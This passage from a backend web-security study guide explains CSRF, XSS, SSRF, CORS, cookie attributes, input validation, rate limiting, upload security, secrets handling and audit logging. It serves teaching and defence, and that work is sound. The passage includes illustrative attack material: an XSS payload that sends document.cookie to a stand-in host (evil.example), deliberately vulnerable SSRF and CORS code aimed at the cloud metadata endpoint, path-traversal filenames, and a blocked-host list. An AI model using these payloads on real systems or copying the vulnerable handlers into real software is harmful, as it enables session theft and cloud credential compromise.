> "CSRF exploits the fact that browsers attach cookies to a request based on the destination, not the origin the request came from — so a malicious page can submit a form to my app and the victim's session cookie rides along automatically. My main defense is SameSite=Lax on the cookie, which stops it from being sent on cross-site state-changing requests, plus a CSRF token as defense in depth for anything sensitive, since a cross-site page can't read my page to obtain that token. The one thing I always keep in mind is scope: CSRF is a cookie problem — an API authenticated purely by a bearer token in a custom header isn't vulnerable to it, because a cross-site form can't set that header. But the moment any cookie is involved, even just a refresh token cookie, that endpoint is back in scope."

**Frequently asked:** How does CSRF work, with an example? · SameSite=Lax vs Strict vs None? · Why doesn't a bearer-token API need CSRF protection? · Why must GET requests never mutate state?

### Practice problem

Build a session-cookie-authenticated `/transfer` endpoint. Demonstrate the attack with a standalone HTML file that auto-submits a cross-origin form. Fix it with `SameSite=Lax` first, then add a CSRF token, and show both defenses independently block the attack.

### Production considerations

- Set `SameSite=Lax` (or `Strict` where flows allow) on every auth cookie by default.
- Keep CSRF tokens for any cookie-authenticated state-changing endpoint, even with `SameSite` set — defense in depth against browser quirks and misconfigurations.
- Audit for state-changing `GET` routes; they are a recurring finding in security reviews.

---

## 8.7 XSS (Cross-Site Scripting)

**Priority: MUST KNOW**

### Definition

XSS is the injection of attacker-controlled script into a page viewed by other users, executing with that page's full privileges — able to read cookies (unless `HttpOnly`), make authenticated requests, and manipulate the DOM.

### Simple meaning

You let a user's text end up as code on someone else's screen.

### Why it is needed

XSS is a client-side vulnerability, but it is caused and prevented almost entirely by **backend decisions**: what you store, how you render it, and what headers you send. A backend engineer who thinks "XSS isn't my problem" is the reason it happens.

### The three types

| Type | Where the payload lives | Example |
|---|---|---|
| **Stored** | Persisted in the database, served to other users later | A malicious `<script>` in a comment field, rendered to every viewer |
| **Reflected** | Bounced directly from a request (URL, form) into the immediate response | A search page that echoes `?q=<script>...` unescaped into the results HTML |
| **DOM-based** | Client-side JavaScript writes untrusted data into the DOM without a round trip to the server | `element.innerHTML = location.hash` |

### How it works internally

```html
<!-- User submits this as their "display name" -->
<script>fetch('https://evil.example/steal?c=' + document.cookie)</script>

<!-- If the backend stores it as-is and a template renders it unescaped -->
<p>Welcome, <script>fetch('https://evil.example/steal?c=' + document.cookie)</script></p>
<!-- The script now executes in every visitor's browser, in the page's own origin -->
```

### Defenses

**1. Output encoding — the primary defense.** Escape data for the context it's rendered into. Modern templating engines (JSX, most server-side template libraries) auto-escape by default — the danger is explicitly opting out.

```jsx
// SAFE — React escapes by default
<p>Welcome, {user.displayName}</p>

// DANGEROUS — explicit opt-out, must be justified and the source must be trusted/sanitized
<p dangerouslySetInnerHTML={{ __html: user.bio }} />
```

If you must render user-supplied HTML (a rich-text bio, for example), **sanitize it server-side** with an allowlist-based library before storage or before render:

```ts
import sanitizeHtml from 'sanitize-html';

const clean = sanitizeHtml(userInput, {
  allowedTags: ['b', 'i', 'em', 'strong', 'a', 'p'],
  allowedAttributes: { a: ['href'] },
  allowedSchemes: ['https'],           // block javascript: URLs
});
```

**2. `HttpOnly` cookies.** This is the backend's single most effective XSS mitigation for session/auth data: even if an XSS payload runs, `document.cookie` cannot see an `HttpOnly` cookie, so the attacker cannot exfiltrate the session token directly (they can still make authenticated requests *as* the victim from within the page, which is why this is mitigation, not a full fix).

**3. Content Security Policy (CSP) — defense in depth.**

```ts
app.use((req, res, next) => {
  res.setHeader(
    'Content-Security-Policy',
    "default-src 'self'; script-src 'self'; object-src 'none'; base-uri 'self'; frame-ancestors 'none'"
  );
  next();
});
```

CSP tells the browser which sources of scripts/styles/etc. are legitimate. `script-src 'self'` blocks inline scripts and scripts from other origins — even if an attacker manages to inject a `<script>` tag, the browser refuses to execute it because it violates policy. Avoid `'unsafe-inline'` in `script-src` wherever possible; it substantially weakens CSP's protection.

**4. Input validation** narrows what can ever reach storage, but is a secondary control — it is easy to miss an encoding edge case, so output encoding must always be the primary defense, not validation alone.

### Real backend usage

- Any field a user can populate that another user (or an admin) will later view: comments, display names, bios, support-ticket messages, uploaded filenames rendered in a UI.
- API responses consumed by a frontend that renders them — the backend cannot fully control the frontend's rendering discipline, but it controls what data reaches it and what headers accompany it (CSP, `X-Content-Type-Options: nosniff`).

### Edge cases

- Escaping the wrong context is still exploitable — HTML-escaping data that's placed inside a `<script>` block or an HTML attribute needs different escaping rules than text-node content.
- Markdown renderers can reintroduce XSS if they allow raw HTML passthrough — configure them to disable it or sanitize the output.
- SVG file uploads can contain embedded `<script>` — treat uploaded SVGs as untrusted HTML-adjacent content (Phase 8.10 covers upload validation).
- JSON API responses are not directly renderable as HTML, so a JSON endpoint itself is not an XSS vector — but the frontend consuming it can still introduce XSS if it renders fields unsafely; backend sanitization at storage time remains valuable defense in depth.

### Common mistakes

1. `dangerouslySetInnerHTML` / `v-html`-equivalents on unsanitized user input.
2. Assuming client-side escaping is "someone else's job" and storing raw HTML anyway.
3. No CSP header at all.
4. Storing user HTML without an allowlist sanitizer, trusting the frontend to always escape correctly forever.
5. `HttpOnly` missing on the auth cookie, turning any XSS into instant session theft.

### Interview answer

> "XSS is attacker-controlled script executing in another user's browser with that page's privileges — stored, reflected, or DOM-based depending on where the payload lives. The primary defense is output encoding for the context you're rendering into, which most modern templating and frontend frameworks do by default; the danger is always the explicit opt-out, like `dangerouslySetInnerHTML`. Where I have to accept rich user HTML, I sanitize it server-side with an allowlist library rather than trusting a blocklist. On the backend specifically, the two controls I always apply are `HttpOnly` on auth cookies, so even a successful XSS can't read the session token via `document.cookie`, and a Content-Security-Policy header restricting script sources as defense in depth, so even an injected script tag won't execute."

**Frequently asked:** Stored vs reflected vs DOM-based XSS? · How does `HttpOnly` help, and what doesn't it prevent? · What is CSP and how does it help? · Why is a blocklist worse than an allowlist for sanitization?

### Practice problem

Build a comment feature that stores raw user input. Demonstrate stored XSS with a payload that would exfiltrate `document.cookie`. Fix it with output encoding, add `HttpOnly` to the session cookie, add a CSP header, and demonstrate each control independently mitigates a different part of the attack.

### Production considerations

- Set `HttpOnly`, `Secure`, and a strict CSP as default security headers across the whole application (a library like `helmet` sets sane baselines).
- Run automated scanning for reflected XSS in CI where feasible; treat any finding as a release blocker.
- Review any use of `dangerouslySetInnerHTML` or equivalent in code review as a mandatory checklist item.

---

## 8.8 SSRF and CORS

**Priority: MUST KNOW**

### SSRF (Server-Side Request Forgery)

**Definition.** SSRF occurs when an attacker induces the server to make an HTTP request to a destination of the attacker's choosing — often reaching internal-only services the attacker could never address directly.

**Why it matters.** Internal networks routinely trust "requests from the server itself" far more than requests from the internet — cloud metadata endpoints, internal admin panels, databases with no auth on the internal network. SSRF turns a seemingly harmless feature ("fetch this URL to generate a preview") into a bridge into that trusted zone.

**How it works.**

```ts
// VULNERABLE: fetches whatever URL the client supplies
app.post('/fetch-preview', async (req, res) => {
  const response = await fetch(req.body.url);      // attacker supplies: http://169.254.169.254/latest/meta-data/
  res.json(await response.json());
});
```

`169.254.169.254` is the AWS/GCP/Azure instance metadata endpoint — reachable only from the instance itself, often serving temporary cloud credentials with no authentication required. An SSRF into this endpoint is a well-documented path to full cloud account compromise, and has caused real, large breaches.

**Defenses.**

```ts
import { isIP } from 'node:net';
import dns from 'node:dns/promises';

const BLOCKED_HOSTS = new Set(['169.254.169.254', 'metadata.google.internal', 'localhost']);

function isPrivateIp(ip: string): boolean {
  return /^(10\.|127\.|169\.254\.|192\.168\.|172\.(1[6-9]|2\d|3[01])\.)/.test(ip)
      || ip === '::1';
}

async function assertSafeUrl(rawUrl: string): Promise<URL> {
  const url = new URL(rawUrl);
  if (!['http:', 'https:'].includes(url.protocol)) throw new Error('scheme not allowed');
  if (BLOCKED_HOSTS.has(url.hostname)) throw new Error('host blocked');

  const addresses = isIP(url.hostname) ? [url.hostname] : (await dns.lookup(url.hostname, { all: true })).map(a => a.address);
  if (addresses.some(isPrivateIp)) throw new Error('private network address blocked'); // DNS rebinding guard

  return url;
}
```

Layered defenses: **allowlist destinations** where possible (best), resolve DNS and reject private/loopback/link-local ranges (defends against DNS rebinding, where a hostname resolves to a public IP at check time and a private one at fetch time), disable HTTP redirects or re-validate the destination after each redirect hop, and run the fetching process with network policies (firewall/security-group egress rules) that block reaching the metadata endpoint and internal ranges regardless of application logic — defense in depth at the infrastructure layer, not just the code.

**Common mistakes:** validating only the initial URL and then following redirects blindly; checking the hostname string but not resolving it (an attacker can use a hostname that resolves to `127.0.0.1`); forgetting that IPv6 and alternate IP encodings (`0x7f000001`, decimal `2130706433` for `127.0.0.1`) can bypass naive string-based checks — use the `net.isIP`/parsed-address approach, not regex on the raw string alone.

### CORS (Cross-Origin Resource Sharing)

**Definition.** CORS is a *browser-enforced* mechanism that relaxes the same-origin policy, letting a server explicitly declare which other origins are permitted to read its responses from browser-based JavaScript.

**Why it matters — and the misconception to correct.** CORS is not a server-side security control against malicious requests; it does not stop a request from being sent (curl, a script, or a mobile app never obey CORS). It only controls whether the **browser lets the calling page's JavaScript read the response**. Configuring CORS is about *legitimate cross-origin frontends*, not about blocking attackers — that job belongs to authentication, authorization and CSRF defenses.

**How it works.**

```
Simple GET → browser sends the request; server response headers decide if JS can read it.
Non-simple request (custom headers, PUT/DELETE, JSON content-type in some cases)
  → browser sends a preflight OPTIONS request first
  → server must respond with Access-Control-Allow-* headers approving the actual request
  → only then does the browser send the real request
```

```ts
import cors from 'cors';

const allowedOrigins = ['https://app.example.com', 'https://admin.example.com'];

app.use(cors({
  origin(origin, callback) {
    if (!origin || allowedOrigins.includes(origin)) callback(null, true);
    else callback(new Error('not allowed by CORS'));
  },
  credentials: true,             // allow cookies to be sent cross-origin — see the warning below
  methods: ['GET', 'POST', 'PUT', 'DELETE'],
  allowedHeaders: ['Content-Type', 'Authorization'],
}));
```

**The dangerous misconfiguration:**

```ts
// NEVER combine these two
app.use(cors({ origin: '*', credentials: true }));
```

`Access-Control-Allow-Origin: *` combined with `Access-Control-Allow-Credentials: true` is actually rejected by browsers when a wildcard is used with credentials — but the equivalent mistake of dynamically reflecting *any* request's `Origin` header back as the allowed origin (rather than checking it against an allowlist) achieves the same dangerous effect and **is** accepted by browsers, effectively allowing any site to make credentialed requests on a victim's behalf and read the response. This is a genuinely common real-world misconfiguration.

```ts
// VULNERABLE: reflects whatever origin asked, with credentials allowed
app.use(cors({ origin: (origin, cb) => cb(null, true), credentials: true }));
```

### Real backend usage

- SSRF hardening on any feature that fetches a user-supplied URL: link unfurling, webhook delivery, image-by-URL upload, PDF generation from a URL.
- CORS configuration for any API consumed by a browser-based frontend on a different origin (a common SPA + API split).

### Edge cases

- SSRF via redirects: the first URL passes validation, but the server returns a redirect to an internal address — must re-validate the destination after following, or disable redirect-following and validate each hop manually.
- SSRF via DNS rebinding: TOCTOU (time-of-check to time-of-use) gap between validating a hostname's resolved IP and actually connecting — mitigated by resolving once and connecting to the validated IP directly, or by network-layer egress controls.
- CORS preflight caching (`Access-Control-Max-Age`) reduces preflight overhead but must be invalidated in the client's understanding if policy changes — this is a performance, not security, nuance.

### Common mistakes

1. Fetching an arbitrary client-supplied URL with no allowlist or private-IP filtering.
2. Believing CORS protects an API from unauthorized *requests* rather than just from browser-JS *reads*.
3. Reflecting the request's `Origin` header as the allowed origin while also enabling credentials.
4. Not re-validating redirect targets in an SSRF-prone fetch feature.

### Interview answer

> "SSRF is when I make the server issue a request to a destination the attacker chooses, which is dangerous because internal networks trust requests from the server itself — cloud metadata endpoints are the textbook target, and an SSRF into one of those has led to real credential theft and account compromise. I defend it by allowlisting destinations where I can, resolving DNS and rejecting private and loopback ranges before connecting, re-validating after any redirect rather than following blindly, and backing that with network-level egress rules so application code isn't the only line of defense.
>
> CORS is a completely different thing that I think gets confused with security against attackers — it's a browser-enforced relaxation of the same-origin policy that controls whether a page's JavaScript can *read* a cross-origin response; it does nothing to stop the request itself from being sent, since tools like curl ignore it entirely. The dangerous mistake is reflecting any request's Origin header back as allowed while also enabling credentials — that effectively lets any site make authenticated requests on a logged-in user's behalf and read the response, so I always check the origin against an explicit allowlist."

**Frequently asked:** What is SSRF and why is the cloud metadata endpoint the classic target? · How do you defend against SSRF, including redirects and DNS rebinding? · What does CORS actually protect against — and not protect against? · Why is `origin: '*'` with `credentials: true` dangerous?

### Practice problem

Build a URL-preview feature. Demonstrate SSRF against a local mock "metadata" endpoint. Fix it with hostname resolution + private-range blocking + redirect re-validation. Separately, misconfigure CORS to reflect any origin with credentials enabled, demonstrate a cross-origin page reading an authenticated response, then fix it with an explicit allowlist.

### Production considerations

- Combine application-level SSRF checks with network egress rules (security groups/firewalls) blocking the metadata endpoint and private ranges from application instances that don't need them.
- Keep the CORS allowlist as a reviewed, explicit config value — never derive it dynamically from the request without validation.
- Log and alert on blocked SSRF attempts and rejected CORS origins; both are reconnaissance signals.

---

## 8.9 Secure Cookies, Input Validation and Rate Limiting

**Priority: MUST KNOW**

### Secure cookie attributes

```ts
res.cookie('sid', value, {
  httpOnly: true,    // JS cannot read it — mitigates XSS token theft (§8.7)
  secure: true,       // only sent over HTTPS
  sameSite: 'lax',    // CSRF mitigation (§8.6)
  path: '/',
  maxAge: 30 * 60 * 1000,
  domain: undefined,  // omit unless you specifically need cross-subdomain sharing — narrower is safer
});
```

Each attribute maps to a specific attack it closes; missing any one reopens exactly that attack, independent of the others. Set all of them, every time, for every auth-related cookie.

### Input validation

**Definition.** Verifying that incoming data conforms to expected shape, type, range and format *before* it is used, stored, or passed to another system.

**Why.** Validation is a broad, structural defense underlying injection prevention (Phase 7, §7.11), XSS prevention (§8.7), SSRF prevention (§8.8), and plain application correctness. "Never trust client input" is the single sentence that summarizes most of this phase.

```ts
import { z } from 'zod';

const CreateOrderSchema = z.object({
  productId: z.coerce.number().int().positive(),
  quantity: z.coerce.number().int().min(1).max(100),
  couponCode: z.string().regex(/^[A-Z0-9_-]{1,20}$/).optional(),
});

app.post('/orders', requireAuth, (req, res, next) => {
  const parsed = CreateOrderSchema.safeParse(req.body);
  if (!parsed.success) return res.status(400).json({ error: parsed.error.flatten() });
  req.validated = parsed.data;
  next();
}, createOrderHandler);
```

**Validate at every trust boundary, not just the outermost API edge** — a value that passed validation on the way in can still be dangerous if it's later used in a different context (e.g., passed to a shell command, a URL fetch, or a raw SQL fragment) without that context's own checks. This is the same "second-order" caution from Phase 7's injection section, generalized.

### Rate limiting

**Definition.** Restricting how many requests a client (by IP, account, or API key) can make in a given time window, to blunt brute-force, credential-stuffing, scraping and denial-of-service.

```ts
import rateLimit from 'express-rate-limit';
import RedisStore from 'rate-limit-redis';

const loginLimiter = rateLimit({
  store: new RedisStore({ client: redisClient }),   // shared store — critical for multi-instance deployments
  windowMs: 15 * 60 * 1000,
  max: 5,                                            // 5 attempts per 15 minutes per key
  keyGenerator: (req) => `${req.ip}:${req.body.email}`,   // combine IP + account to limit both angles
  standardHeaders: true,
  legacyHeaders: false,
  handler: (req, res) => res.status(429).json({ error: 'too_many_attempts' }),
});

app.post('/login', loginLimiter, loginHandler);
```

**Layer rate limiting at multiple levels:** per-IP (blunt but catches broad abuse), per-account (catches distributed credential stuffing against one target), and a global limit (protects the service itself under any kind of spike). For login specifically, pair rate limiting with **exponential backoff** and consider **account lockout with a safe unlock path** (email-verified reset) rather than permanent lockout, which is itself a denial-of-service vector against the legitimate user.

### Edge cases

- An in-memory rate limiter store is useless across multiple instances — exactly like the session-store mistake in §8.3, use a shared store (Redis).
- Rate limiting by IP alone fails against distributed attacks and penalizes shared IPs (corporate NAT, mobile carrier NAT) — combine with account-based keys.
- Validation schemas must reject *unexpected* fields, not just check the expected ones — an unvalidated extra field can enable mass-assignment-style bugs if it's carelessly spread into a database write.
- `Secure` cookies will silently fail to be set at all over plain HTTP in some browsers — always serve auth flows over HTTPS end to end, including in local development via a trusted cert or a documented HTTP-only dev exception.

### Common mistakes

1. Validating only known-good fields and blindly spreading the rest of the body into a database update (Phase 7, §7.11's ORM operator-injection point rhymes with this).
2. Rate limiting only by IP.
3. In-memory rate limit store in a multi-instance deployment.
4. Permanent account lockout after N failed attempts, without a safe recovery path.
5. Forgetting `secure: true` in a staging environment served without HTTPS, then shipping the same config to production where it silently degrades protection if HTTPS isn't enforced elsewhere.

### Interview answer

> "Cookie attributes each close a specific attack — HttpOnly against XSS reading the token, Secure against transmission over plaintext HTTP, SameSite against CSRF — so I set all three on every auth cookie, not just the ones that seem relevant to whatever I'm focused on that day.
>
> Input validation is the structural defense underneath injection, XSS and SSRF prevention — I validate shape, type and range at every trust boundary with a schema library, and I make sure schemas reject unexpected fields rather than just checking the ones I expect, because an unvalidated extra field can slip into a database write if it's spread carelessly.
>
> For rate limiting I use a shared store like Redis so it works across instances, and I layer it — per IP for broad abuse, per account for distributed credential stuffing against one target — with exponential backoff on login rather than a permanent lockout, since permanent lockout is itself a denial-of-service against the real user."

**Frequently asked:** What does each cookie attribute protect against? · Why validate at every trust boundary, not just the API edge? · How do you rate-limit correctly across multiple instances? · Why is permanent account lockout a bad idea?

### Practice problem

Add Zod validation rejecting unknown fields to every write endpoint in a small project. Add layered rate limiting (per-IP and per-account) to the login endpoint with a Redis store, and write a test simulating 10 rapid failed logins asserting the 6th is rejected with 429.

### Production considerations

- Centralize cookie-setting logic (one function, one set of defaults) so no endpoint can forget an attribute.
- Monitor 429 rates and failed-login rates as security dashboards, not just as noise to suppress.
- Keep validation schemas in version control next to the endpoints they guard, reviewed on every change like the endpoint logic itself.

---

## 8.10 File Upload Security

**Priority: MUST KNOW**

### Definition

File upload security is the set of controls ensuring that user-supplied files cannot be used to execute code, exhaust resources, overwrite unintended paths, or serve malicious content to other users.

### Simple meaning

A file upload is a request to store and later re-serve arbitrary bytes an untrusted party chose. Treat it with exactly that level of suspicion.

### Why it is needed

Upload endpoints are a favorite target because they combine several attack surfaces at once: path traversal, content-type spoofing, decompression bombs, XSS via served content (§8.7), and remote code execution if an uploaded file ever lands somewhere it can be *executed* rather than merely stored.

### The controls, layered

**1. Validate type by content, not by the client-supplied filename or `Content-Type` header — both are trivially spoofable.**

```ts
import { fileTypeFromBuffer } from 'file-type';

async function assertAllowedType(buffer: Buffer, allowed: string[]) {
  const detected = await fileTypeFromBuffer(buffer);        // sniffs actual magic bytes
  if (!detected || !allowed.includes(detected.mime)) {
    throw new ValidationError('unsupported file type');
  }
}
```

**2. Enforce a strict size limit before reading the whole file into memory.**

```ts
import multer from 'multer';

const upload = multer({
  storage: multer.memoryStorage(),
  limits: { fileSize: 5 * 1024 * 1024, files: 1 },   // reject oversized uploads at the multipart-parsing layer
});
```

**3. Never trust or reuse the client-supplied filename for storage — it enables path traversal.**

```ts
// VULNERABLE
const dest = path.join(UPLOAD_DIR, req.file.originalname);   // "../../etc/passwd" if unchecked

// SAFE — generate the storage name; never derive it from client input
const ext = path.extname(req.file.originalname).toLowerCase();
const safeExt = ['.jpg', '.png', '.pdf'].includes(ext) ? ext : '';
const storedName = `${randomUUID()}${safeExt}`;
const dest = path.join(UPLOAD_DIR, storedName);   // constant directory, generated name — traversal impossible
```

**4. Store outside the web root, or in object storage (S3-equivalent), never in a directly executable path.** If files are served, do it through a controlled endpoint or with a bucket policy that disables execution and forces `Content-Disposition` appropriately — never let an uploaded file be reachable at a path the application server would interpret as code (e.g., inside a directory served with script execution enabled).

**5. Serve with a locked-down `Content-Type` and `Content-Disposition`, and never on the same origin as your main application if the files might contain HTML/SVG.**

```ts
res.setHeader('Content-Type', detected.mime);
res.setHeader('X-Content-Type-Options', 'nosniff');          // stop the browser guessing a different type
res.setHeader('Content-Disposition', `attachment; filename="${sanitizedDisplayName}"`);
```

Serving user uploads from a **separate subdomain** (e.g., `usercontent.example.com` rather than `example.com`) is a strong, common mitigation: even if an uploaded file contains executable HTML/JS (a malicious SVG or HTML file), it executes in a different origin from your main application and cannot read your app's cookies or DOM.

**6. Scan for malware where the threat model warrants it** (ClamAV or a cloud provider's scanning service), especially for uploads that will be shared with other users or downloaded broadly.

**7. Guard against decompression bombs** for any endpoint that unzips or otherwise decompresses uploaded content — cap decompressed size and reject before it exhausts memory or disk (this connects directly to Phase 4's streaming and backpressure material: process compressed uploads as a stream with a hard byte ceiling, never buffer-then-decompress blindly).

### Real backend usage

- Profile picture / avatar uploads.
- Document/attachment uploads in a support or collaboration product.
- CSV/bulk-import endpoints (which also need the injection- and resource-exhaustion caution above, plus row-count/size caps before parsing).

### Edge cases

- Image files can embed malicious payloads in metadata or via format-confusion (a "GIF" that's actually a PHP file with a spoofed extension in a misconfigured server) — content-sniffing plus storing outside any executable path closes this regardless of extension games.
- Re-encoding uploaded images (resizing/transcoding through a trusted library) as a side effect strips most embedded-payload risk for image types specifically, at the cost of some processing time — a strong extra layer where feasible.
- ZIP-slip: a malicious archive with path-traversal entry names (`../../etc/cron.d/x`) that, if extracted naively, writes outside the intended directory — always validate each extracted entry's resolved path stays within the target directory before writing.

### Common mistakes

1. Trusting the `Content-Type` header or file extension for validation.
2. Using the client's filename directly for storage.
3. Serving uploads from the same origin as the main app with permissive content-type sniffing.
4. No size limit, or a size limit enforced only after the whole file is buffered into memory.
5. Extracting archives without validating entry paths (ZIP-slip).
6. Storing uploads inside a directory the web server will execute (e.g., a PHP-enabled directory on a shared host, or a Node static-serving path that also happens to `require()` things from it — a self-inflicted but real category of misconfiguration).

### Interview answer

> "I don't trust anything about an uploaded file that the client controls — not the extension, not the Content-Type header, not the filename. I sniff the actual content to determine the real type, generate a random name for storage so the client's filename can never cause path traversal, enforce a size limit before the file is fully buffered, and store it outside any path the server would execute. When files are served back, I set `X-Content-Type-Options: nosniff` and, importantly, serve user content from a separate subdomain so that even a malicious HTML or SVG upload executes in a different origin and can't touch my main application's cookies or DOM. For anything that decompresses uploaded content, I cap the decompressed size to avoid a decompression bomb, and if it's an archive I validate every extracted entry's path stays inside the target directory to prevent zip-slip."

**Frequently asked:** Why can't you trust the `Content-Type` header? · How do you prevent path traversal on upload? · What is ZIP-slip? · Why serve user uploads from a separate subdomain? · How do you prevent a decompression bomb?

### Practice problem

Build an upload endpoint that: sniffs real content type, rejects mismatches, generates a random storage filename, enforces a 5 MB limit at the parsing layer, and serves files with `nosniff` and `Content-Disposition: attachment`. Attempt a path-traversal filename and a spoofed-extension upload and confirm both are rejected or neutralized.

### Production considerations

- Serve user-generated content from an isolated subdomain or a separate storage domain entirely (a CDN in front of object storage is the common pattern).
- Run malware scanning for any upload shared beyond the uploading user.
- Set object-storage bucket policies to deny execution and enforce the content-type/disposition headers at the storage layer, not only in application code, as defense in depth.

---

## 8.11 Secrets Management and Response Hygiene

**Priority: MUST KNOW**

### Secrets management

**Definition.** Secrets management is the practice of storing, distributing, rotating, and auditing access to credentials (database passwords, API keys, signing keys, third-party tokens) without embedding them in source code or unencrypted config.

**Why.** A secret committed to source control is compromised the moment it's pushed — it lives in git history forever, even after being "removed" in a later commit, and is exposed to anyone with repo access, including in public repos scraped continuously by automated bots hunting for exactly this.

**How, in layers of increasing maturity:**

```ts
// Baseline: environment variables, never hardcoded, never committed
const dbPassword = process.env.DB_PASSWORD;
if (!dbPassword) throw new Error('DB_PASSWORD not set');   // fail fast, don't run with a missing secret
```

```
.env               ← real secrets, in .gitignore, never committed
.env.example       ← committed, documents required variable names with placeholder values
```

Beyond environment variables, dedicated secret managers (AWS Secrets Manager, HashiCorp Vault, GCP Secret Manager) add: encryption at rest, fine-grained access control, automatic rotation, and audit logs of exactly which service/identity accessed which secret when — meaningfully stronger than a `.env` file sitting on disk, and expected at production maturity beyond a small early-stage project.

**Rotation.** Any secret should be rotatable without a code deploy — reference it by name/version from the secret manager rather than baking a specific value into a deploy artifact. Rotate immediately, unconditionally, if a secret is ever suspected exposed (accidentally committed, logged, or shared) — "probably fine" is not an acceptable response to a leaked credential.

**Hashing vs encrypting secrets, revisited:** passwords are *hashed* (one-way, §8.2) because you only ever need to verify them, never recover them. API keys you issue to *others* to send back to you are typically hashed the same way for storage. But secrets *you* need to use later, like a third-party API key you call out with, must be *encrypted* (reversible, with a separate key-encryption-key, often managed by the secrets manager) since you need the plaintext back to use it.

### Response hygiene — not leaking information you didn't mean to

**Definition.** Ensuring API responses, error messages, and headers do not reveal internal details useful to an attacker: stack traces, library versions, database schema, or which of two failure reasons occurred when only one should be distinguishable externally.

```ts
// VULNERABLE: leaks stack trace, error class, and implicitly the ORM/DB in use
app.use((err, req, res, next) => {
  res.status(500).json({ error: err.message, stack: err.stack });
});

// SAFE: log full detail server-side; return a generic, mapped response to the client
app.use((err, req, res, next) => {
  logger.error({ err, requestId: req.id }, 'unhandled error');
  const status = mapErrorToStatus(err);        // Phase 7, §7.7's error-code mapping applies here
  res.status(status).json({
    error: PUBLIC_ERROR_MESSAGES[status] ?? 'internal_error',
    requestId: req.id,                          // lets the user report it without exposing internals
  });
});
```

**The specific pattern from §8.2, generalized:** anywhere two outcomes should be indistinguishable to an external caller (wrong password vs. no such account; resource doesn't exist vs. you're not authorized to see it, §8.1), return the *same* status code, the *same* error shape, and — where timing could leak the distinction — the *same* rough response time. This principle recurs across the whole phase because it is the same mistake in different clothes: giving an attacker a free bit of information about internal state through *any* observable channel — status code, message text, response time, or header presence.

**Security headers**, set globally, that reduce information leakage and harden default browser behaviors:

```ts
import helmet from 'helmet';
app.use(helmet());     // sets X-Content-Type-Options, X-Frame-Options, a baseline CSP, and more

app.disable('x-powered-by');   // don't announce "Express" and its version to every response
```

### Edge cases

- Logs themselves are a secrets-leak surface — never log full request bodies, authorization headers, or cookies without redaction; a logging pipeline is often less access-controlled than the production database it's logging about.
- Third-party error-tracking tools (Sentry-equivalent) can capture request payloads by default — configure scrubbing rules for known-sensitive fields before enabling them.
- `.env.example` must never accidentally contain a real value copy-pasted "just this once."
- CI/CD pipeline logs can leak secrets if a build script echoes an environment variable for debugging — treat CI logs with the same suspicion as application logs.

### Common mistakes

1. Secrets committed to git, "removed" in a later commit but still in history.
2. Verbose error responses in production (stack traces, ORM error text, SQL fragments).
3. Different response times or messages for enumeration-sensitive checks.
4. Logging full request bodies indiscriminately, capturing passwords or tokens.
5. No rotation plan — a secret set once at project inception and never touched again for years.
6. Leaving default framework headers (`X-Powered-By`) announcing the exact stack in use.

### Interview answer

> "I keep secrets out of source control entirely — environment variables at minimum, a dedicated secrets manager once the project has real production stakes, since that adds encryption at rest, access control and rotation without a code deploy. If a secret is ever suspected leaked, I rotate it immediately rather than assessing whether it's 'probably fine.'
>
> On response hygiene, the pattern I apply everywhere is: anywhere two different internal outcomes shouldn't be distinguishable to an external caller — wrong password versus no such account, resource missing versus not authorized — I return the same status, the same error shape, and I've checked that timing doesn't leak the difference either. In production I never return a stack trace or raw error message to the client; I log the full detail server-side with a request ID and return a generic mapped error with that ID, so the user can report it without me handing an attacker my schema or library versions for free."

**Frequently asked:** How do you manage secrets at different maturity levels? · What do you do if a secret leaks? · Why hash some secrets and encrypt others? · What's wrong with returning stack traces to clients? · Give an example of a response-hygiene leak beyond passwords.

### Practice problem

Audit an existing project for: hardcoded secrets (grep for common patterns), verbose error responses, and inconsistent 403/404 usage across at least three endpoints. Fix all three classes of finding and add a generic error-handling middleware with request-ID correlation.

### Production considerations

- Adopt a secrets manager before the first production incident forces the conversation, not after.
- Add a pre-commit hook and a CI step that scans for committed secrets (common tools do pattern-based detection for known credential formats).
- Standardize the error-response shape and the 403-vs-404 policy once, project-wide, rather than deciding it per-endpoint.

---

## 8.12 Practice Projects and Audit Logging

**Priority: MUST KNOW**

### Audit logging

**Definition.** An audit log is an append-only, tamper-resistant record of security-relevant events — who did what, to what, and when — kept separately from application debug logs and retained deliberately.

**Why.** When something goes wrong — an account compromised, data altered incorrectly, a permission escalated — the audit log is the only source of truth for reconstructing what happened and who is accountable. It is also frequently a compliance requirement, independent of whether an incident ever occurs.

**What belongs in it:**

```ts
interface AuditEvent {
  id: string;
  occurredAt: Date;
  actorId: string | null;        // null for unauthenticated/system events
  actorType: 'user' | 'system' | 'api_key';
  action: string;                 // 'user.login', 'order.refund', 'role.granted'
  targetType: string;
  targetId: string;
  ip: string;
  userAgent: string;
  metadata: Record<string, unknown>;   // context, NEVER secrets or full PII dumps
}

async function audit(event: Omit<AuditEvent, 'id' | 'occurredAt'>) {
  await auditRepo.append({ ...event, id: randomUUID(), occurredAt: new Date() });
}

// Called at every security-relevant decision point
await audit({ actorId: user.id, actorType: 'user', action: 'login.success', targetType: 'user', targetId: user.id, ip: req.ip, userAgent: req.get('user-agent'), metadata: {} });
await audit({ actorId: admin.id, actorType: 'user', action: 'role.granted', targetType: 'user', targetId: targetUser.id, ip: req.ip, userAgent: req.get('user-agent'), metadata: { role: 'admin', grantedBy: admin.id } });
```

**Events that must always be audited:** login success/failure, logout, password change/reset, MFA enrollment/disable, role/permission changes, access to or export of sensitive data, account creation/deletion, refresh-token-reuse detection (§8.4), and every authorization denial pattern worth watching (§8.1).

**Design properties an audit log needs that a normal application log doesn't:** append-only (updates/deletes should be exceptional and themselves audited, or disallowed entirely at the database-permission level); retained on a defined schedule independent of normal data-retention policy (often longer, for compliance); queryable by actor and by target, so "show me everything user X did" and "show me everything that happened to resource Y" are both fast (index accordingly, per Phase 6, §6.4); stored separately enough that a compromise of the main application database doesn't automatically compromise or erase the audit trail.

### Edge cases

- Logging the *attempt* is as important as logging the *success* — failed authorization attempts and failed logins are often the earlier, more actionable signal.
- Audit logs containing PII are themselves subject to privacy regulation — retention and access to the audit log needs its own policy, not a blanket "keep forever."
- High-volume audit events (every single read of a resource, at scale) can be prohibitively expensive to log fully — decide deliberately which reads are sensitive enough to warrant it (viewing another user's financial records: yes; viewing your own profile: usually no).

### Common mistakes

1. Treating debug/application logs as the audit trail — they get rotated, sampled, or dropped under load, and lack the structural guarantees an audit trail needs.
2. Logging only successes, missing the more actionable failed-attempt signal.
3. No index on actor or target, making "what did this account do" queries a full table scan at incident-response time — exactly when speed matters most.
